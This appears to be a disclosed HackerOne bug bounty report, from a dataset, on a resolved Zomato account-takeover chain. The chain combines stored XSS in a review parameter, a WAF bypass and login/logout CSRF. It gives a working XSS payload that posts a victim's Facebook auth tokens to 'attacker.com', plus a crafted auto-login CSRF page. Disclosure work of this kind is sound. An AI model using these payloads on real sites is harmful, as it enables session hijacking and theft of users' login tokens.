---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '632017'
original_report_id: '632017'
title: Self-Stored XSS - Chained with login/logout CSRF
weakness: Cross-site Scripting (XSS) - Stored
team_handle: zomato
created_at: '2019-06-29T10:19:54.984Z'
disclosed_at: '2019-07-03T11:02:19.848Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 31
asset_identifier: '*.zomato.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-stored
---

# Self-Stored XSS - Chained with login/logout CSRF

## Metadata

- HackerOne Report ID: 632017
- Weakness: Cross-site Scripting (XSS) - Stored
- Program: zomato
- Disclosed At: 2019-07-03T11:02:19.848Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

> NOTE! This report explains taking over an account in a single click by chaining stored XSS, WAF bypass, login and logout CSRF.

**Summary:** Attacker can takeover someone's account by stealing their facebook / google login tokens chaining multiple vulnerabilities.

**Description:** Attacker leaves a review on restaurant's page with XSS payload. Which is triggered when attacker tries to edit the review. By chaining multiple bugs, a webpage is crafted that will make victim logout of his account, login to attacker's account, redirects to XSS review page. Victim's facebook / google tokens are sent to attacker when victim clicks on edit button.

**Platform(s) Affected:** Website

## Steps To Reproduce:

**Request:**
Vulnerable parameter: **`with_tags_data`**

Method: `POST`
URL: `https://www.zomato.com/php/submitReview`
Parameters:
```
review=140 characters long review&
review_db=140 characters long review&
with_tags_data=<script>prompt(0,document.domain)</script>&
res_id=19132208&
city_id=11333&
rating=5&
is_edit=0&
review_id=0&
save_image=1&
instagram_images_to_update=[]&
instagram_json_data={"data":[]}&
uploaded_images_json=[]&
share_to_fb=false&
share_to_tw=false&
snippet=restaurant-review&
web_source=default&
csrf_token=2acad4ba08d4000000000007923a25d&
external_url=
```
**Click on `Edit` button. It will trigger prompt box**


### _Write review with XSS payload_
Use the following JavaScript payload and add it in **with_tags_data** parameter.
This code, when executed, will get Facebook authentication tokens of victim and send to attacker's server. Code can be improved to get Google authentication tokens as well. Code can be improved to get token with extra permissions like getting Google's contact list. In PoC video I have used minified version of this script
```html
<script>
// load fb js-sdk
(function(d, s, id){
      var js, fjs = d.getElementsByTagName(s)[0];
      if (d.getElementById(id)) {return;}
      js = d.createElement(s); js.id = id;
      js.src = "//connect.facebook.net/en_US/sdk.js";
      fjs.parentNode.insertBefore(js, fjs);
    }(document, 'script', 'facebook-jssdk'));

window.fbAsyncInit = function() {
      FB.init({
        appId      : '288523881080', // zomato fb app id
        xfbml      : true,
        version    : 'v3.1'
      });

//get auth response ( accessToken and signedRequest )
FB.login(function(){
	$.post('https://attacker.com/tokens.php',FB.getAuthResponse())}); // send token and signed_request to attacker
	document.location.href = 'https://www.zomato.com/logout'; // logout from victims's account
 }
</script>
```

### _Crafting auto login page_
1. Intercept HTTP requests and login with facebook
2. Create an HTML form to mimic request on `https://www.zomato.com/php/asyncLogin.php`
3. Replace link in last line of  `script` code with link to review with XSS payload.

```html
<form target="attackerTokens" method="post" action="https://www.zomato.com/php/asyncLogin.php?access_token=██████">
	<input name='authResponse[accessToken]' value='█████'>
	<input name='authResponse[userID]' value='███'>
	<input name='authResponse[expiresIn]' value='5073'>
	<input name='authResponse[signedRequest]' value='████'>
	<input name='authResponse[reauthorize_required_in]' value='7774406'>
	<input name='authResponse[data_access_expiration_time]' value='1569568133'>
	<input type=submit>
</form>
<iframe name="attackerTokens"></iframe>

<!-- logout current session -->
<img src="https://www.zomato.com/logout">
<script>
setTimeout(function(){ document.forms[0].submit(); }, 1500); // login attackers account
setTimeout(function(){ window.location.href='http://zoma.to/link_to_review'; }, 4000); // redirect to XSS payload page
</script>
```

**What does this page do?**
* This page will logout victim if already logged in. See `img` tag.
* After that, it will submit the login form and attacker's account be logged in on victim's computer.
* After login, it will redirect to review page with XSS payload. 
* Once victim click on `Edit` button, XSS will trigger and get victim's facebook tokens and send it to attacker's server.
* Attacker is capable of using these token to login to victim's account.

### _Bugs Chained_
1. CSRF is not working on logout URL
2. CSRF is not working on login URL
3. WAF is not working when javascript code is sent in `with_tags_data` parameter
4. `with_tags_data` is vulnerable to Stored XSS.

> Fact: Facebook login tokens are by default valid for an hour. But attacker can run a script on server to get fresh tokens every minute, which he can place into crafted HTML.

> Note: No real restaurant pages were harmed in PoC video. I replaced `res_id` with the restaurant I added.
> In PoC, **Techboy** is attacker and **Sukhmeet** is victim.

## Impact

One click can make someone lose his account.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
